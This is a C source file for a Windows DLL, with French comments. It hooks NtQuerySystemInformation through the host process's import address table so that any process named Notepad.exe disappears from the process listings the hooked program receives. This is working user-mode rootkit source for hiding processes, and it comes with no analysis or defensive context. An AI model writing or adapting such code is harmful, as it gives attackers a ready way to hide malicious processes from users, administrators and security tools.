#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <winternl.h>
#include <stdlib.h>

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

// Structure adaptée pour 64 bits
typedef struct _MY_SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER Reserved[3];
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    ULONG BasePriority;
    HANDLE ProcessId;
    HANDLE InheritedFromProcessId;
} MY_SYSTEM_PROCESS_INFORMATION, * PMY_SYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS(NTAPI* PNT_QUERY_SYSTEM_INFORMATION)(
    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout PVOID SystemInformation,
    __in ULONG SystemInformationLength,
    __out_opt PULONG ReturnLength
    );

PNT_QUERY_SYSTEM_INFORMATION OriginalQuerySystemInformation = NULL;

NTSTATUS NTAPI HookedNtQuerySystemInformation(
    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout PVOID SystemInformation,
    __in ULONG SystemInformationLength,
    __out_opt PULONG ReturnLength
)
{
    NTSTATUS status = OriginalQuerySystemInformation(
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength);

    if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status) {
        PMY_SYSTEM_PROCESS_INFORMATION pCurrent = NULL;
        PMY_SYSTEM_PROCESS_INFORMATION pNext = (PMY_SYSTEM_PROCESS_INFORMATION)SystemInformation;

        ULONG_PTR offset = 0;
        while (offset < SystemInformationLength) {
            pCurrent = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)SystemInformation + offset);

            if (pCurrent->NextEntryOffset == 0) {
                break;
            }

            PMY_SYSTEM_PROCESS_INFORMATION pNextEntry =
                (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);

            // Vérification sécurisée du nom du processus
            if (pNextEntry->ImageName.Buffer != NULL &&
                pNextEntry->ImageName.Length > 0) {

                // Comparaison case-insensitive pour plus de robustesse
                if (_wcsicmp(pNextEntry->ImageName.Buffer, L"Notepad.exe") == 0) {
                    if (pNextEntry->NextEntryOffset == 0) {
                        pCurrent->NextEntryOffset = 0;
                    }
                    else {
                        pCurrent->NextEntryOffset += pNextEntry->NextEntryOffset;
                    }
                }
            }

            if (pCurrent->NextEntryOffset == 0) {
                break;
            }
            offset += pCurrent->NextEntryOffset;
        }
    }
    return status;
}

// Fonction pour trouver l'adresse d'une fonction dans la IAT
FARPROC FindIATFunction(HMODULE hModule, const char* dllName, const char* funcName) {
    PIMAGE_DOS_HEADER pIDH = (PIMAGE_DOS_HEADER)hModule;
    if (pIDH->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }

    PIMAGE_NT_HEADERS pINH = (PIMAGE_NT_HEADERS)((LPBYTE)hModule + pIDH->e_lfanew);
    if (pINH->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }

    PIMAGE_IMPORT_DESCRIPTOR pIID = (PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)hModule +
        pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    for (; pIID->Characteristics != 0; pIID++) {
        const char* name = (const char*)((LPBYTE)hModule + pIID->Name);
        if (_stricmp(name, dllName) == 0) {
            PIMAGE_THUNK_DATA pITD = (PIMAGE_THUNK_DATA)((LPBYTE)hModule + pIID->OriginalFirstThunk);
            PIMAGE_THUNK_DATA pFirstThunk = (PIMAGE_THUNK_DATA)((LPBYTE)hModule + pIID->FirstThunk);

            for (; pITD->u1.Ordinal != 0; pITD++, pFirstThunk++) {
                if (!(pITD->u1.Ordinal & IMAGE_ORDINAL_FLAG)) {
                    PIMAGE_IMPORT_BY_NAME pIIBM = (PIMAGE_IMPORT_BY_NAME)((LPBYTE)hModule + pITD->u1.AddressOfData);
                    if (strcmp(pIIBM->Name, funcName) == 0) {
                        return (FARPROC)&pFirstThunk->u1.Function;
                    }
                }
            }
        }
    }
    return NULL;
}

void SetHook() {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    OriginalQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(hNtdll, "NtQuerySystemInformation");

    if (OriginalQuerySystemInformation == NULL) {
        return;
    }

    // Hook via la IAT du module courant
    FARPROC* ppFunction = (FARPROC*)FindIATFunction(GetModuleHandle(NULL), "ntdll.dll", "NtQuerySystemInformation");
    if (ppFunction != NULL) {
        DWORD dwOldProtect;
        if (VirtualProtect(ppFunction, sizeof(FARPROC), PAGE_READWRITE, &dwOldProtect)) {
            *ppFunction = (FARPROC)HookedNtQuerySystemInformation;
            VirtualProtect(ppFunction, sizeof(FARPROC), dwOldProtect, &dwOldProtect);
        }
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    switch (dwReason) {
    case DLL_PROCESS_ATTACH:
        // Éviter les appels bloquants dans DllMain
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SetHook, NULL, 0, NULL);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
